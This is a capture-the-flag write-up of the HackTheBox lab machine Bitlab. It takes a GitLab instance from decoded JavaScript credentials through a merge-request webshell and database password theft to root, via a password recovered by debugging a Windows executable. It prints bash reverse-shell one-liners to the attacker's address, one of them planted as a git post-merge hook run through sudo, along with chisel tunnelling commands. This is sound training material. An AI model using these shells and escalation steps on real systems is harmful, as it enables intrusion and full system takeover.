---
title: HTB: Bitlab
url: https://0xdf.gitlab.io/2020/01/11/htb-bitlab.html
date: 2020-01-11T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-bitlab, nmap, bookmark, javascript, obfuscation, webshell, git, gitlab, docker, ping-sweep, chisel, tunnel, psql, credentials, ssh, reverse-engineering, ida, x64dbg, git-hooks, oscp-plus-v1, oscp-plus-v2
---

![Bitlab](https://0xdfimages.gitlab.io/img/bitlab-cover.png)

Bitlab was a box centered around automation of things, even if the series challenges were each rather unrealistic. It starts with a Gitlab instance where the help link has been changed to give access to javascript encoded credentials. Once logged in, I have access to the codebase for the custom profile pages use in this instance, and there’s automation in place such that when I merge a change into master, it goes live right away. So I can add a webshell and get access to the box. In the database, I’ll find the next users credentials for SSH access. For Root, I’ll reverse engineer a Windows executable which is executing Putty with credentials, and use those creds to get root. In Beyond Root, I’ll look at an unintended path from www-data to root using git hooks, and explore a call to `GetUserNameW` that is destined to fail.

## Box Info

| Name | [Bitlab](https://hackthebox.com/machines/bitlab)  [Bitlab](https://hackthebox.com/machines/bitlab) [Play on HackTheBox](https://hackthebox.com/machines/bitlab) |
| --- | --- |
| Release Date | [07 Sep 2019](https://twitter.com/hackthebox_eu/status/1169935428570484741) |
| Retire Date | 11 Jan 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bitlab |
| Radar Graph | Radar chart for Bitlab |
| First Blood User | 00:30:44[mprox mprox](https://app.hackthebox.com/users/16690) |
| First Blood Root | 00:38:20[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creators | [Frey Frey](https://app.hackthebox.com/users/33283)  [thek thek](https://app.hackthebox.com/users/4615) |

## Recon

### nmap

`nmap` reveals two ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-08 02:58 EDT
Nmap scan report for 10.10.10.114
Host is up (0.19s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-08 03:00 EDT
Nmap scan report for 10.10.10.114
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds

```

### Website - TCP 80

The website is hosting an instance of GitLab Community Edition, software to host and manage git repositories:

![1567926220359](https://0xdfimages.gitlab.io/img/1567926220359.png)

I don’t have creds at this point. I tried a few typical ones, and the [old and new default passwords](https://gitlab.com/gitlab-org/gitlab-ce/commit/8a01a1222875b190d32769f7a6e7a74720079d2a), but none of them worrked.

There’s a few links on the page, and when I got to `/help`, it’s not the typical help page, but rather a dir listing showing a file `bookmarks.html`:

![1567926478500](https://0xdfimages.gitlab.io/img/1567926478500.png)

Clicking on it, I see a list of hyperlinks:

![1567926508925](https://0xdfimages.gitlab.io/img/1567926508925.png)

All of them go to sites out of scope except the last, “Gitlab Login”, which of course is the most interesting:

```

<a href="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" add_date="1554932142">Gitlab Login</a>

```

## Shell as www-data

### GitLab Login

There are two different ways to approach getting the credentials out of this html link.

#### Bookmarks Bar

Give the title of the page, I right clicked on the “GitLab Login” link, and selected “Bookmark This Link”. For the folder, I changed it to “Bookmarks Toolbar”:

![1567927425398](https://0xdfimages.gitlab.io/img/1567927425398.png)

This link now shows up in my bookmarks toolbar in Firefox:

![1567927462380](https://0xdfimages.gitlab.io/img/1567927462380.png)

When I’m on the Bitlab login page, and I click that link, the creds fill in. I can see the password by editing the field from a type password to a type text:

![](https://0xdfimages.gitlab.io/img/bitlab-bookmarks-bar.gif)

#### Javascript Deobfuscation

While the bookmarks bar was easy, never pass up the chance to deobfuscate some Javascript. There are plenty of Javascript beautifiers, but especially for small script, I find putting the spacing in by hand gives me a better feel for what’s going on. After some spacing and basic clean up, I get:

```

(function() {
    var _0x4b18 = [ "\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()

```

It’s only 3 lines. The first is an array of encoded strings. The next two use those strings to interact with the document.

I can throw this code into [tio.run](https://tio.run/#javascript-babel-node). I don’t need the `document` statements as they are (there won’t be a `document` object to interact with), so I’ll add `console.log` statements to print out what those lines would have done:

```

    var _0x4b18 = [ "\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
    //document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    //document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
console.log("document[" + _0x4b18[2] + "](" + _0x4b18[1] + ")[" + _0x4b18[0] + "] = " + _0x4b18[3] + ";")
console.log("document[" + _0x4b18[2] + "](" + _0x4b18[4] + ")[" + _0x4b18[0] + "] = " + _0x4b18[5] + ";")

```

When I run this, I get:

```

document[getElementById](user_login)[value] = clave;
document[getElementById](user_password)[value] = 11des0081x;

```

### Enumeration

Either way I get the credentials, I can now log in with ‘clave’ / ‘11des0081x’. I see two projects:

![image-20200108223600304](https://0xdfimages.gitlab.io/img/image-20200108223600304.png)

Both projects belong to a different user, Administrator. The links to the projects show that Administrator’s usename is root (which is the default user in GitLab).

#### Snippets

Before diving into the projects, I checked the Snippets (in the More menu), and there was one named Postgresql:

![image-20200108223702249](https://0xdfimages.gitlab.io/img/image-20200108223702249.png)

It contains php code to connect to postgres:

```

<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");

```

I’ll note those creds for later.

#### Profile

Profile has three files, the `README.md`, an image named `developer.jpg`, and an `index.php`:

[![profile project](https://0xdfimages.gitlab.io/img/1567946111694.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567946111694.png)

I’ll note the comments in the readme about connecting with postgres. That’s a hint for something to check out later.

The code for `index.php` contains a profile page for Clave. It’s all static HTML, despite being a php page.

#### Deployer

Browsing over to the other project, Deployer, I see just a `README.md` and an `index.php`:

[![deployer project](https://0xdfimages.gitlab.io/img/1567946556138.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567946556138.png)

The `README.md` contains a link about [Gitlab webhooks](https://docs.gitlab.com/ee/user/project/integrations/webhooks.html). These are method to run scripts when different actions happen related to a project.

`index.php` is a page that will listen for a POST request, read the input from that, parse out the expected fields (repo, event, state, and branch). If the parameters match certain values, it will go into `../profile` and run `sudo git pull`.

```

<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";

```

This means that if code is committed to the Profile repo and then merged into the master branch, assuming the web hooks are set up correctly to post to this endpoint, the box will pull down the new code. That just means that if I can get something malicious into the repo, I can get it to deploy back to the server.

#### /profile

I was planning to look at the settings for my current use, so I went to the top right corner, and clicked on the circle with my profile picture, and then to Settings. It took me here:

![1567947676735](https://0xdfimages.gitlab.io/img/1567947676735.png)

That’s not what I was expecting. But, I recognize it as the page from the Profile project.

### Webshell

Now that I found the profile page running, I can test if I can make changes to the profile page and have them show up at `/profile`.

I’ll pull up `index.php` in Gitlab and hit Edit. I’ll add a small webshell just at the top of the HTML body:

[![added webshell](https://0xdfimages.gitlab.io/img/1567948251039.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567948251039.png)

At the bottom of the page, I’m given options to set a commit message and set the target branch:

![1567948316579](https://0xdfimages.gitlab.io/img/1567948316579.png)

I don’t want to commit to the master branch, but rather create a new branch, and then later merge that into master, as that’s what will trigger the update. It’s likely that I can’t commit to master anyway. I’ll leave checked the box to start a new merge request, as as soon as I commit, I’m going to merge. When I hit Commit changes, it takes me to the page to create a new merge request:

![image-20200108224158218](https://0xdfimages.gitlab.io/img/image-20200108224158218.png)

This merge will take my new branch and add the changes into master, and that will trigger the pushing of the code to Bitlab, so it’s running live on the server.

I’ll make sure to check “﻿Remove source branch when merge request is accepted.” (to clean up after myself), and hit Submit merge request. Now I’m at the page for the request:

[![merge request](https://0xdfimages.gitlab.io/img/1567948660860.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567948660860.png)

Now I can hit merge, and the page updates in page to show it’s merged:

[![merged!](https://0xdfimages.gitlab.io/img/1567948704891.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567948704891.png)

Now on visiting `http://10.10.10.114/profile/?0xdf=id`, I see faint white text at the top left:

[![webshell active](https://0xdfimages.gitlab.io/img/1567948801713.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567948801713.png)

In the view source window, I can see the result in the middle:

```

<body>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">

```

### Shell

Now to translate that to a shell, I’ll visit `http://10.10.10.114/profile/?0xdf=bash -c 'bash -i >%26 /dev/tcp/10.10.14.30/443 0>%261'`, and I get a callback on `nc`:

```

root@kali# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.114.
Ncat: Connection from 10.10.10.114:48796.
bash: cannot set terminal process group (1171): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bitlab:/var/www/html/profile$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Shell as clave

### Enumeration

There’s evidence all over the place that this host is running docker containers. `ifconfig` has many interfaces. I don’t see gitlab or postgres running anywhere. And there’s a set if docker configs in `/srv`. `ip neigh` shows two hosts in the cache:

```

www-data@bitlab:/srv$ ip neigh
10.10.10.2 dev eth0 lladdr 00:50:56:b0:58:fc REACHABLE
172.19.0.2 dev br-c8b1f0816703 lladdr 02:42:ac:13:00:02 STALE
172.19.0.3 dev br-c8b1f0816703 lladdr 02:42:ac:13:00:03 REACHABLE
fe80::250:56ff:feb0:58fc dev eth0 lladdr 00:50:56:b0:58:fc router STALE

```

A quick parallel `ping` sweep shows 4 containers in that subnet:

```

www-data@bitlab:/srv$ time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
172.19.0.2
172.19.0.3
172.19.0.1
172.19.0.4
172.19.0.5

real    0m0.928s
user    0m0.129s
sys     0m0.051s

```

`nmap` is on the host, and will quickly show me the containers:

```

www-data@bitlab:/srv$ nmap  172.19.0.2-5                                                                                            

Starting Nmap 7.60 ( https://nmap.org ) at 2019-09-08 14:16 UTC
Nmap scan report for 172.19.0.2
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8181/tcp open  intermapper

Nmap scan report for 172.19.0.3
Host is up (0.00048s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.19.0.4
Host is up (0.00047s latency).
All 1000 scanned ports on 172.19.0.4 are closed

Nmap scan report for 172.19.0.5
Host is up (0.00018s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap done: 4 IP addresses (4 hosts up) scanned in 0.20 seconds

```

.2 and .3 are candidates to be Gitlab, and the postgres host is .5.

I also see that the local box is listening on 5432. This is a forward into the postgres container, so I can talk to either.

### Tunneling

I want to check the database, but `psql` isn’t on the box. I did some testing, and it looks like the firewall is blocking any incoming ports that aren’t meant to be up, so I can’t just use `socat` to create a tunnel. I’ll upload [Chisel](https://github.com/jpillora/chisel), my [go to for this kind of thing](/cheatsheets/chisel). I’ll upload it:

```

www-data@bitlab:/dev/shm$ wget 10.10.14.30/chisel
--2019-09-08 15:53:50--  http://10.10.14.30/chisel
Connecting to 10.10.14.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10459399 (10.0M) [application/octet-stream]
Saving to: 'chisel'

chisel                                                 100%[============================================================================================================================>]   9.97M   260KB/s    in 30s     

2019-09-08 15:54:20 (337 KB/s) - 'chisel' saved [10459399/10459399]

www-data@bitlab:/dev/shm$ chmod +x chisel

```

Now I’ll start the server on my host with the `--reverse` option so that I can create a reverse tunnel:

```

root@kali:/opt/chisel# ./chisel server -p 8000 --reverse
2019/09/08 11:56:39 server: Reverse tunnelling enabled
2019/09/08 11:56:39 server: Fingerprint 87:f2:60:3d:3b:3a:af:b9:be:99:e9:e7:fd:68:33:de
2019/09/08 11:56:39 server: Listening on 0.0.0.0:8000...

```

Now I’ll have the client on Bitlab connect to the server, and specify that I want a reverse tunnel to listen on 5432 on my host and have that connect to 5432 on localhost:

```

www-data@bitlab:/dev/shm$ ./chisel client 10.10.14.30:8000 R:5432:localhost:5432
2019/09/08 15:56:50 client: Connecting to ws://10.10.14.30:8000
2019/09/08 15:56:50 client: Fingerprint 87:f2:60:3d:3b:3a:af:b9:be:99:e9:e7:fd:68:33:de
2019/09/08 15:56:50 client: Connected (Latency 43.361952ms)

```

I can see the connection at the server as well:

```

2019/09/08 11:57:30 server: proxy#1:R:0.0.0.0:5432=>localhost:5432: Listening 

```

Now I’ll use a local `psql` to connect:

```

root@kali# psql -h 127.0.0.1 -p 5432 -U profiles                                                                                                                                                                                      
Password for user profiles: 
psql (11.5 (Debian 11.5-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
Type "help" for help.

profiles=>

```

I can list the dbs:

```

profiles=> \list
                             List of databases
   Name    |  Owner   | Encoding | Collate | Ctype |   Access privileges   
-----------+----------+----------+---------+-------+-----------------------
 gitlab    | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | gitlab=CTc/postgres
 postgres  | postgres | UTF8     | C       | C     | 
 profiles  | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | profiles=CTc/postgres
 template0 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
 template1 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
(5 rows)

```

I can list tables in the current db, profiles:

```

profiles=> \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | profiles | table | profiles
(1 row)

```

I’ll grab everything from the one table:

```

profiles=> select * from profiles;
 id | username |        password        
----+----------+------------------------
  1 | clave    | c3NoLXN0cjBuZy1wQHNz==
(1 row)

```

### SSH

While that may look base64 encoded, it’s actually clave’s password. I can connect over ssh from here:

```

root@kali# ssh clave@10.10.10.114
The authenticity of host '10.10.10.114 (10.10.10.114)' can't be established.
ECDSA key fingerprint is SHA256:hNHxoptKsWqkzdME7Bfb+cGjskcAAGySJazK+gDDCHQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.114' (ECDSA) to the list of known hosts.
clave@10.10.10.114's password: 
Last login: Thu Aug  8 14:40:09 2019
clave@bitlab:~$

```

And now I can grab `user.txt`:

```

clave@bitlab:~$ cat user.txt
1e3fd81e************************

```

## Priv: clave –> root

### Enumeration

Also sitting in clave’s homedir is an exe:

```

clave@bitlab:~$ ls
RemoteConnection.exe  user.txt
clave@bitlab:~$ file RemoteConnection.exe 
RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows

```

Kind of weird to have an exe sitting on a Linux home directory. I’ll pull it back with `scp`:

```

root@kali# scp clave@10.10.10.114:~/RemoteConnection.exe .
clave@10.10.10.114's password: 
RemoteConnection.exe                                   100%   14KB 193.9KB/s   00:00 

```

### RemoteConnection.exe

#### Run It

When I run the exe, it just tells me “Access Denited !!”. Given the file name, I opened Wireshark and ran it again, but didn’t see anything there either.

#### Static Analysis

I’ll start looking at the binary statically. First, always a good idea to run `strings` and look for anything interesting there. A few at the top jump out as interesting:

```

root@kali# strings -n 12 RemoteConnection.exe
!This program cannot be run in DOS mode.
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS
Access Denied !!
string too long
invalid string position
GetUserNameW
ADVAPI32.dll
ShellExecuteW  
...[snip]...

```

There’s a base64 alphabet, followed by what could be a base64-encoded string. There’s also a call to `ShellExecuteW`, which means it runs another program.

I’ll decode that string, but it contains a lot of unprintable characters:

```

root@kali# echo XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS | base64 -d | xxd
00000000: 5d12 011b 4502 0e1d 0725 1708 061f 0412  ]...E....%......
00000010: 4f1a 0707 504c 0204 4552 3014 4438 4838  O...PL..ER0.D8H8
00000020: 2125 4b07 253c 354f 2b56 164c 0f56 0436  !%K.%<5O+V.L.V.6
00000030: 473b 52                                  G;R

```

#### RE

I’l open it in Ida Pro free. There’s a lot of unnamed functions, and no clear `main`, so I’ll go to the Imports tab, find “ShellExecuteW”, double click it to go to it, then click on the function name and hit `x` to get references:

![image-20200109072341859](https://0xdfimages.gitlab.io/img/image-20200109072341859.png)

There’s really only one call there, at `sub_401520+13A`. I’ll hit ok to go there:

![image-20200109072523377](https://0xdfimages.gitlab.io/img/image-20200109072523377.png)

It’s calling `putty.exe`. Just above, I see it’s comparing some string to `clave`.

#### Debugging

`putty.exe` will likely be making a remote connection (which fits with the exe name), so it may have creds. Rather than try to figure out the algorithm obfuscating the password, I’ll just debug and see if I can see it in memory. In Ida, I’ll hit space to switch out of graph mode, and see that the `ShellExecuteW` call is at `04165A`:

![image-20200109204557691](https://0xdfimages.gitlab.io/img/image-20200109204557691.png)

When I open `x32dbg` (since this is a 32-bit executable, I could see all the `eax` and `ebx`, not `rax` and `rbx` in the Ida disassembly), the address space will be offset due to ASLR, but this line will still end in `165A`. I first hit the forward Run arrow to get to user code, and then scroll up a bit to find it, in my case, at `D2165A`:

![image-20200109204835706](https://0xdfimages.gitlab.io/img/image-20200109204835706.png)

I can see the comparison to `clave` nine lines above. I’ll add a break point at `ShellExecuteW`, and hit Run, but the program just exits. It’s not reaching this point. I’ll try adding one at the cmp, `XX1640`. This time it breaks there, and I can see something interesting in the values:

![image-20200109205026112](https://0xdfimages.gitlab.io/img/image-20200109205026112.png)

It looks like the command line options for `putty.exe`, including `-pw Qf7]8YSV.wDNF*[7d?j&eD4^`.

### SSH

With this password, I can SSH to Bitlab as root:

```

root@kali# ssh root@10.10.10.114
root@10.10.10.114's password: 
Last login: Fri Sep 13 14:11:14 2019
root@bitlab:~# 

```

And grab `root.txt`:

```

root@bitlab:~# cat root.txt
8d4cc131************************

```

## Beyond Root

### Unintended Path from www-data to root

With a shell as www-data, I ran `sudo -l`, and saw I could run `git pull` without password:

```

www-data@bitlab:/$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull

```

This makes sense, as I saw the deploy project needed to run this automatically when new code is committed.

In `git`, a `pull` is actually a `git fetch` followed by a `git merge`. I can make my own hook, a `post-merge` hook, and put a shell in there. The challenge I have is that both projects are owned by root and not writable by me:

```

www-data@bitlab:/var/www/html$ find -type d -name hooks -ls
  2502298      4 drwxr-xr-x   2 root     root         4096 Jan  4  2019 ./profile/.git/hooks
  2760044      4 drwxr-xr-x   2 root     root         4096 Jan  4  2019 ./deployer/.git/hooks

```

I could create a new project, but to do a `git pull`, I’ll need to connect it to a remote project. I could stand up my own git server on my kali box.

A much easier way to do this is to just copy one of the projects. I’ll copy it into a working directory in `/dev/shm`:

```

www-data@bitlab:/dev/shm/.0xdf$ cp -r /var/www/html/profile .

```

Now I can write a hook as the folder owner:

```

www-data@bitlab:/dev/shm/.0xdf$ ls -ld profile/.git/hooks/
drwxr-xr-x 2 www-data www-data 260 Sep  8 13:37 profile/.git/hooks/

```

I’ll write a reverse shell as a `post-merge` hook, and set it executable:

```

www-data@bitlab:/dev/shm/.0xdf/profile$ cat .git/hooks/post-merge
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.30/443 0>&1
www-data@bitlab:/dev/shm/.0xdf/profile$ chmod +x .git/hooks/post-merge

```

Now I’ll run `git pull`, but I don’t get a callback on `nc`:

```

www-data@bitlab:/dev/shm/.0xdf/profile$ sudo /usr/bin/git pull
Already up to date.

```

Since there’s no changes, no merge happens. I’ll take this opportunity to remove my webshell from `index.php` using the same steps I used to add it. Once I make that change, I can pull again, and this time:

```

www-data@bitlab:/dev/shm/.0xdf/profile$ sudo /usr/bin/git pull   
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 4 (delta 3), reused 3 (delta 2)
Unpacking objects: 100% (4/4), done.
From ssh://localhost:3022/root/profile
   69f1340..72805f3  master     -> origin/master
Updating 69f1340..72805f3
Fast-forward
 index.php | 1 -
 1 file changed, 1 deletion(-)

```

The www-data window hangs, but in the `nc` window, I’m root:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.114.
Ncat: Connection from 10.10.10.114:52336.
root@bitlab:/dev/shm/.0xdf/profile# id
id
uid=0(root) gid=0(root) groups=0(root)

```

### Debugging Username

When I initially tried to run this program, it just crashed. Some debugging showed me that it was crashing at a call to `GetUserNameW`. I took a guess that my username `0xdf` was throwing things off, created a new user named `dummy,` and switched over, and did the debugging above.

I was failing to get to `ShellExecuteW` at a check comparing something to `clave`, so I figured I would create a user clave, and debugging as him. It still failed to reach the call to Putty.

I debugged the call to `GetUserNameW`. The [docs](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamew) say it takes two parameters:

> ```

> BOOL GetUserNameW(
>   LPWSTR  lpBuffer,
>   LPDWORD pcbBuffer
> );
>
> ```

The first is a buffer to put the username in, and the second is the size of that buffer. It adds:

> If this buffer is not large enough to contain the entire user name, the function fails.

And later about the second buffer:

> If *lpBuffer* is too small, the function fails and [GetLastError](https://docs.microsoft.com/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror) returns ERROR\_INSUFFICIENT\_BUFFER. This parameter receives the required buffer size, including the terminating null character.

At my break point, I see the two values passed:

![image-20200109211334857](https://0xdfimages.gitlab.io/img/image-20200109211334857.png)

This is very broken. The first parameter should be a pointer of an address to write the username to. This will crash and fail if it tries to write to 0x00000004. But, if I look at the buffer (right click on the buffer address and select “Follow in dump”), I see it’s value is 4. So before the call fails to write to the invalid address, it’s going to error out because the username is too long. I can step over this call and see the `pcbBuffer` changes to 6, the number of characters required for “clave\x00”:

![image-20200109211531075](https://0xdfimages.gitlab.io/img/image-20200109211531075.png)

I can also see the error in the `LastError`:

![image-20200109211550230](https://0xdfimages.gitlab.io/img/image-20200109211550230.png)

When I do get to the compare with the string `clave`, it’s comparing “6” to it. That’s where this comes from. That’s why when I get to the compare, it’s comparing 6 to `clave`. There’s no way this could succeed as written.